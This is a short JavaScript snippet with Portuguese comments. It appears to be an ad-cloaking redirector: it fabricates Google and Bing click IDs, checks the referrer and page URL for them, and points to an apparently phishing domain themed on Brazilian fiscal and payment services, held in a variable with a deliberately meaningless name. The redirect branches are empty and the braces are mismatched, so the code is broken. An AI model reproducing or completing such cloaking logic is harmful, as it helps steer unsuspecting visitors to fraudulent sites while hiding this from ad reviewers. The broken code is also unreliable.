  <script>

const urls = [

    'nfe/index',
    'cte/index',
    'asp/indexp',

    'xml/indexp',

];

// Função para gerar um hash MD5 (requer biblioteca crypto ou implementação personalizada)
function generateHash() {
    // Gerando um hash simples como alternativa ao MD5
    // Para MD5 real, seria necessário uma biblioteca como crypto-js
    return Math.random().toString(36).substring(2, 15) + 
           Math.random().toString(36).substring(2, 15) + 
           Date.now().toString(36);
}

// Selecionando URL aleatória
const randomIndex = Math.floor(Math.random() * urls.length);
const randomUrl = urls[randomIndex];
const hash = generateHash();
const googlerandomUrlWithHash = randomUrl + '?gclid=' + hash;
const bingrandomUrlWithHash = randomUrl + '?msclkid=' + hash;
const xirjfgjsdhdjd = 'https://recargasfacil.receitaspagmeionline.com/';  

// Obtendo o referer (disponível apenas no navegador)
let referer;
if (typeof document !== 'undefined' && document.referrer) {
    referer = document.referrer;
} else {
    referer = 'not found';
}

// Obtendo a URL atual (equivalente ao REQUEST_URI do PHP)
let currentUrl;
if (typeof window !== 'undefined') {
    currentUrl = window.location.href;
} else {
    currentUrl = '';
}

// Verificando condições e redirecionando
if (/gclid/i.test(referer) || /gclid/i.test(currentUrl)) {
    // Redirecionamento (no navegador)
    if (typeof window !== 'undefined') {

} else if (/msclkid/i.test(referer) || /msclkid/i.test(currentUrl)) {

    }
} else {
    // Bloco vazio equivalente ao else do PHP
}
  
</script>
